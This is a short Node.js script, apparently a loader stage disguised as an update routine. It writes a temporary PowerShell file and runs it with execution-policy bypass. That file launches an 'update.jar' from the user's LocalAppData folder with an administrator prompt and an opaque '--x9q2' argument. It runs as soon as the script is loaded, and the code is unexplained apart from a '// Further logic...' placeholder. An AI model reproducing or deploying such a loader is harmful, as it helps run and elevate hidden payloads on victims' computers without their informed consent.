
const fs = require("fs");
const path = require("path");
const { spawn, exec } = require("child_process");
const os = require("os");
const AdmZip = require("adm-zip");

async function run() {
    const tempDir = process.env.LOCALAPPDATA || path.join(process.env.USERPROFILE, "AppData", "Local");
    const updateDir = path.join(tempDir, "update");
    const jarPath = path.join(updateDir, "update.jar");
    const ps1Path = path.join(os.tmpdir(), `script_${Date.now()}.ps1`);

    const ps1Content = `
try {
    Start-Process -FilePath "${jarPath}" -ArgumentList '--x9q2' -Verb RunAs
    exit 0
} catch {
    exit 1
}
    `;

    try {
        fs.writeFileSync(ps1Path, ps1Content, "utf8");
        
        const command = `powershell -ExecutionPolicy Bypass -NoProfile -NonInteractive -File "${ps1Path}"`;
        
        exec(command, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error.message}`);
                return;
            }
            // Further logic...
        });
    } catch (e) {
        console.error("Execution failed", e);
    }
}

run();
